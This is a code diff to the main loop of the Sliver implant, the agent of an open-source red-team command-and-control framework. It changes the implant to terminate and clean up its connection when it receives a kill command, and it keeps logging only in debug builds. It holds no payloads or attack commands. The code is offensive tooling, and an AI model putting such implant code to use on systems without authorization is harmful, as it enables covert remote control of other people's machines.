@@ -27,7 +27,8 @@ import "C"
 import (
 	"crypto/rand"
 	"encoding/binary"
-	"log"
+	"errors"
+
 	insecureRand "math/rand"
 	"os"
 	"os/user"
@@ -38,8 +39,8 @@ import (
 	"sync"
 	// {{end}}
 
-	// {{if .Config.Debug}}{{else}}
-	"io/ioutil"
+	// {{if .Config.Debug}}
+	"log"
 	// {{end}}
 
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
@@ -64,6 +65,7 @@ import (
 var (
 	InstanceID       string
 	connectionErrors = 0
+	ErrTerminate     = errors.New("terminate")
 )
 
 func init() {
@@ -171,8 +173,6 @@ func main() {
 		}
 	}
 	// {{else}}
-	log.SetFlags(0)
-	log.SetOutput(ioutil.Discard)
 	// {{end}}
 
 	// {{if .Config.Debug}}
@@ -443,7 +443,7 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
 	sysHandlers := handlers.GetSystemHandlers()
-	specHandlers := handlers.GetSpecialHandlers()
+	specHandlers := handlers.GetKillHandlers()
 
 	for _, task := range tasks {
 		// {{if .Config.Debug}}
@@ -547,6 +547,10 @@ func openSessionHandler(data []byte) {
 			connectionAttempts++
 			if connection != nil {
 				err := sessionMainLoop(connection)
+				if err == ErrTerminate {
+					connection.Cleanup()
+					return
+				}
 				if err == nil {
 					break
 				}
@@ -595,15 +599,15 @@ func sessionMainLoop(connection *transports.Connection) error {
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
 	sysHandlers := handlers.GetSystemHandlers()
-	specialHandlers := handlers.GetSpecialHandlers()
+	specialHandlers := handlers.GetKillHandlers()
 	rportfwdHandlers := handlers.GetRportFwdHandlers()
 
 	for envelope := range connection.Recv {
-		if handler, ok := specialHandlers[envelope.Type]; ok {
+		if _, ok := specialHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] specialHandler %d", envelope.Type)
 			// {{end}}
-			handler(envelope.Data, connection)
+			return ErrTerminate
 		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
